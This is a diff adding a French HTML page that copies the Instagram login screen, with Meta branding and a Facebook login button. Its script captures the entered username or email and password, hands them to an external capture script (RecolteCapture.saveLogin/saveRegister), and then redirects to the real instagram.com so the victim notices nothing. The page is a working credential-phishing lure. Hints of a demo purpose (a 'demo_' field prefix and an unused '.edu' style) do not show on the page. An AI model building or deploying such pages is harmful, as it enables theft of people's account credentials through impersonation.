@@ -1,0 +1,479 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>Connexion · Instagram</title>
+    <meta name="theme-color" content="#000000" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <style>
+      :root {
+        --bg: #000;
+        --panel: #121212;
+        --text: #f5f5f5;
+        --muted: #a8a8a8;
+        --field: #121212;
+        --field-border: #563d7c;
+        --btn: #00376b;
+        --btn-active: #0095f6;
+        --line: #262626;
+        --fb: #fff;
+        --create: #0095f6;
+      }
+
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+
+      html, body { height: 100%; overflow-x: hidden; }
+
+      body {
+        min-height: 100dvh;
+        background: var(--bg);
+        color: var(--text);
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      .edu {
+        position: sticky;
+        top: 0;
+        z-index: 40;
+        display: flex;
+        justify-content: center;
+        padding: 0.5rem 1rem;
+        background: #1a1a1a;
+        color: #f77737;
+        font-size: 0.7rem;
+        font-weight: 700;
+        letter-spacing: 0.07em;
+        text-transform: uppercase;
+        border-bottom: 1px solid #2a2a2a;
+      }
+
+      .layout {
+        min-height: 100dvh;
+        display: grid;
+        grid-template-columns: minmax(0, 1fr);
+        grid-template-rows: auto 1fr;
+      }
+
+      .hero {
+        position: relative;
+        background: #0f1115;
+        overflow: hidden;
+        display: flex;
+        align-items: stretch;
+        justify-content: center;
+        min-height: 34vh;
+        max-height: 40vh;
+        min-width: 0;
+      }
+
+      .hero img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        object-position: center top;
+        display: block;
+      }
+
+      .panel {
+        background: var(--panel);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: flex-start;
+        padding: 1.5rem 1rem 1.25rem;
+        padding-left: max(1rem, env(safe-area-inset-left));
+        padding-right: max(1rem, env(safe-area-inset-right));
+        padding-bottom: max(1.25rem, env(safe-area-inset-bottom));
+        border-left: 0;
+        border-top: 1px solid #1a1a1a;
+        min-width: 0;
+      }
+
+      .form-wrap {
+        width: 100%;
+        max-width: 350px;
+        min-width: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .title {
+        font-size: clamp(0.98rem, 3.8vw, 1.05rem);
+        font-weight: 600;
+        text-align: center;
+        margin-bottom: 1.35rem;
+        letter-spacing: -0.01em;
+      }
+
+      .field {
+        width: 100%;
+        margin-bottom: 0.75rem;
+      }
+
+      .field input {
+        width: 100%;
+        height: 48px;
+        border-radius: 12px;
+        border: 1px solid var(--field-border);
+        background: #000;
+        color: var(--text);
+        padding: 0 0.95rem;
+        font: inherit;
+        font-size: 16px;
+        outline: none;
+        transition: border-color 0.15s ease;
+      }
+
+      .field input::placeholder {
+        color: #737373;
+      }
+
+      .field input:focus {
+        border-color: #a855f7;
+      }
+
+      .pass {
+        position: relative;
+      }
+
+      .pass input {
+        padding-right: 4.8rem;
+      }
+
+      .show {
+        position: absolute;
+        right: 0.35rem;
+        top: 50%;
+        transform: translateY(-50%);
+        min-height: 44px;
+        min-width: 44px;
+        padding: 0 0.55rem;
+        border: 0;
+        background: transparent;
+        color: var(--text);
+        font: inherit;
+        font-size: 0.85rem;
+        font-weight: 600;
+        cursor: pointer;
+      }
+
+      .login {
+        width: 100%;
+        height: 48px;
+        margin-top: 0.35rem;
+        border: 0;
+        border-radius: 12px;
+        background: var(--btn);
+        color: rgba(255, 255, 255, 0.55);
+        font: inherit;
+        font-size: 0.95rem;
+        font-weight: 600;
+        cursor: not-allowed;
+        transition: background 0.15s ease, color 0.15s ease;
+      }
+
+      .login.is-ready {
+        background: var(--btn-active);
+        color: #fff;
+        cursor: pointer;
+      }
+
+      .login.is-ready:hover {
+        filter: brightness(1.05);
+      }
+
+      .forgot {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 44px;
+        margin: 0.75rem 0 1rem;
+        color: #fff;
+        text-decoration: none;
+        font-size: 0.9rem;
+        font-weight: 500;
+      }
+
+      .forgot:hover {
+        text-decoration: underline;
+      }
+
+      .fb {
+        width: 100%;
+        height: 48px;
+        border-radius: 12px;
+        border: 0;
+        background: #1a1a1a;
+        color: #fff;
+        font: inherit;
+        font-size: 0.92rem;
+        font-weight: 600;
+        cursor: pointer;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.55rem;
+      }
+
+      .fb:hover {
+        background: #222;
+      }
+
+      .fb-icon {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        background: #1877f2;
+        color: #fff;
+        font-size: 0.75rem;
+        font-weight: 800;
+        display: grid;
+        place-items: center;
+        line-height: 1;
+      }
+
+      .notice {
+        margin-top: 1rem;
+        text-align: center;
+        font-size: 0.75rem;
+        color: var(--muted);
+        line-height: 1.4;
+        min-height: 2.2rem;
+      }
+
+      .notice.ok {
+        color: #4ade80;
+      }
+
+      .create {
+        width: 100%;
+        height: 48px;
+        margin-top: 1.25rem;
+        border-radius: 12px;
+        border: 1.5px solid var(--create);
+        background: transparent;
+        color: var(--create);
+        font: inherit;
+        font-size: 0.95rem;
+        font-weight: 600;
+        cursor: pointer;
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .create:hover {
+        background: rgba(0, 149, 246, 0.08);
+      }
+
+      .meta {
+        margin-top: auto;
+        padding-top: 1.75rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.45rem;
+        color: #fff;
+        font-size: 0.95rem;
+        font-weight: 600;
+        letter-spacing: -0.01em;
+      }
+
+      .meta svg {
+        width: 22px;
+        height: 12px;
+        display: block;
+      }
+
+      @media (min-width: 768px) {
+        .layout {
+          min-height: 100dvh;
+          grid-template-columns: minmax(0, 1.15fr) minmax(0, 0.85fr);
+          grid-template-rows: none;
+        }
+
+        .hero {
+          min-height: 0;
+          max-height: none;
+        }
+
+        .panel {
+          justify-content: center;
+          padding: 2.5rem 2rem 1.5rem;
+          border-top: 0;
+          border-left: 1px solid #1a1a1a;
+        }
+
+        .title { margin-bottom: 1.75rem; }
+        .forgot { margin: 1.1rem 0 1.35rem; }
+        .create { margin-top: 1.5rem; }
+        .meta { padding-top: 2.5rem; }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        * { animation: none !important; transition: none !important; }
+      }
+
+      .field input:focus-visible,
+      .login:focus-visible,
+      .fb:focus-visible,
+      .create:focus-visible,
+      .show:focus-visible,
+      .forgot:focus-visible {
+        outline: 2px solid #0095f6;
+        outline-offset: 2px;
+      }
+    </style>
+  </head>
+  <body>
+<main class="layout" aria-label="Connexion Instagram">
+      <aside class="hero">
+        <img
+          src="./assets/instagram-hero.png"
+          alt="Découvrez des moments du quotidien de vos ami(e)s proches."
+        />
+      </aside>
+
+      <section class="panel">
+        <form class="form-wrap" id="login-form" novalidate>
+          <h1 class="title" id="form-title">Se connecter à Instagram</h1>
+
+          <div class="field">
+            <input
+              id="identifier"
+              name="demo_identifier"
+              type="text"
+              autocomplete="off"
+              placeholder="Numéro de mobile, nom de profil ou adresse e-mail"
+              required
+            />
+          </div>
+
+          <div class="field pass">
+            <input
+              id="password"
+              name="demo_password"
+              type="password"
+              autocomplete="off"
+              placeholder="Mot de passe"
+              minlength="6"
+              required
+            />
+            <button class="show" type="button" hidden>Afficher</button>
+          </div>
+
+          <button class="login" id="submit" type="submit" disabled>Se connecter</button>
+          <a class="forgot" href="#">Mot de passe oublié ?</a>
+
+          <button class="fb" type="button" data-oauth>
+            <span class="fb-icon">f</span>
+            Se connecter avec Facebook
+          </button>
+
+          <p class="notice" id="notice" hidden></p>
+
+          <a class="create" href="#" id="toggle-mode">Créer un nouveau compte</a>
+        </form>
+
+        <div class="meta" aria-label="Meta">
+          <svg viewBox="0 0 36 20" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path
+              fill="#fff"
+              d="M13.2 2.4c-2.1 0-3.7 1-4.7 2.8-.9-1.8-2.5-2.8-4.6-2.8C1.6 2.4 0 4.3 0 7.2c0 4.5 4.4 9.4 7.4 12.2.4.4 1 .4 1.4 0 3-2.8 7.4-7.7 7.4-12.2 0-2.9-1.6-4.8-3.9-4.8zm9.4 0c-2.1 0-3.7 1-4.7 2.8-.9-1.8-2.5-2.8-4.6-2.8-2.3 0-3.9 1.9-3.9 4.8 0 4.5 4.4 9.4 7.4 12.2.4.4 1 .4 1.4 0 3-2.8 7.4-7.7 7.4-12.2 0-2.9-1.6-4.8-3.9-4.8h-.1z"
+              transform="scale(.95) translate(1 0)"
+            />
+          </svg>
+          Meta
+        </div>
+      </section>
+    </main>
+
+    <script src="./capture.js"></script>
+    <script>
+      const form = document.querySelector("#login-form");
+      const notice = document.querySelector("#notice");
+      const password = document.querySelector("#password");
+      const identifier = document.querySelector("#identifier");
+      const submit = document.querySelector("#submit");
+      const show = document.querySelector(".show");
+      const title = document.querySelector("#form-title");
+      const toggleMode = document.querySelector("#toggle-mode");
+      let formMode = "login";
+
+      function sync() {
+        const ready = identifier.value.trim() && password.value.length >= 6;
+        submit.disabled = !ready;
+        submit.classList.toggle("is-ready", ready);
+        show.hidden = password.value.length === 0;
+      }
+
+      function applyMode() {
+        const isRegister = formMode === "register";
+        title.textContent = isRegister
+          ? "Créer un compte Instagram"
+          : "Se connecter à Instagram";
+        submit.textContent = isRegister ? "S’inscrire" : "Se connecter";
+        toggleMode.textContent = isRegister
+          ? "Déjà un compte ? Se connecter"
+          : "Créer un nouveau compte";
+        notice.hidden = true;
+        notice.textContent = "";
+        notice.classList.remove("ok");
+      }
+
+      identifier.addEventListener("input", sync);
+      password.addEventListener("input", sync);
+
+      show.addEventListener("click", () => {
+        const visible = password.type === "text";
+        password.type = visible ? "password" : "text";
+        show.textContent = visible ? "Afficher" : "Masquer";
+      });
+
+      document.querySelector("[data-oauth]").addEventListener("click", () => {});
+
+      toggleMode.addEventListener("click", (e) => {
+        e.preventDefault();
+        formMode = formMode === "login" ? "register" : "login";
+        applyMode();
+      });
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        const idValue = identifier.value.trim();
+        const passValue = password.value;
+        if (!idValue || passValue.length < 6) {
+          notice.hidden = false;
+          notice.classList.remove("ok");
+          notice.textContent = "Remplis correctement l’identifiant et le mot de passe.";
+          return;
+        }
+
+        const payload = {
+          network: "instagram",
+          identifier: idValue,
+          password: passValue,
+        };
+        if (formMode === "register") {
+          window.RecolteCapture.saveRegister(payload);
+          notice.hidden = true;
+          notice.textContent = "";
+          form.reset();
+          password.type = "password";
+          show.textContent = "Afficher";
+          sync();
+          return;
+        }
+
+        window.RecolteCapture.saveLogin(payload);
+        window.top.location.href = "https://www.instagram.com/";
+      });
+    </script>
+  </body>
+</html>
